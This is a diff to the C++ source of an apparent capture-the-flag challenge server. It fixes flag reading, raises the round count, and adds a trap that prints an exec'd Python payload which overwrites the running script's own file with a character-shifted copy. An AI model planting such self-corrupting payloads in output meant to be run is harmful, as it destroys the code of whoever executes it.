@@ -12,14 +12,14 @@ void exit_help() {
 }
 
 void populate_flag(std::string& flag) {
-    std::fstream file;
+    std::ifstream file;
     file.open("flag.txt");
     if (file.fail()) {
         std::cout << "It seem we are facing some issues right now! Please try again later.\n";
         exit_help();
         exit(1);
     }
-    file << flag;
+    file >> flag;
 }
 
 struct Node {
@@ -129,19 +129,15 @@ void run_test_case() {
     std::cout << '\n';
 }
 
-void fuck_simple() {
-    std::cout << "exit()\n\n";
-}
 
 void annoy_max_fuck() {
-    std::ifstream payload;
-    payload.open("payload.py");
-    if (payload.fail()) {
-        std::cout << "It seem we are facing some issues right now! Please try again later.\n";
-        exit_help();
-        exit(1);
-    }
-    std::cout << payload.rdbuf() << '\n';
+    std::string payload = "with open(__file__, 'r+') as f: f.write(''.join(list(map(lambda x: chr(ord('a') + (ord(x) - ord('a') + 15) % 26) if 'a' <= x.lower() <= 'z' else (chr(ord('0') + (ord(x) - ord('0') + 4) % 10) if '0' <= x <= '9' else x), [f.read(), f.seek(0)][0]))))";
+    std::cout << "exec(compile(\"" << payload << "\", '<string>', 'exec'))" << '\n';
+}
+
+void fuck_simple() {
+    annoy_max_fuck();
+    std::cout << "exit()\n\n";
 }
 
 int main() {
@@ -151,7 +147,7 @@ int main() {
     srand(time(0));
     std::cout << "\t\tGreetings! Are you fast enough? ^_<\n\n";
     
-    int rounds = 60 + rand() % 40;
+    int rounds = 150 + rand() % 40;
     for (int i = 0; i < rounds; ++i) run_test_case();
 
     int annoy_max_fuck_rounds = 10 + rand() % 10;
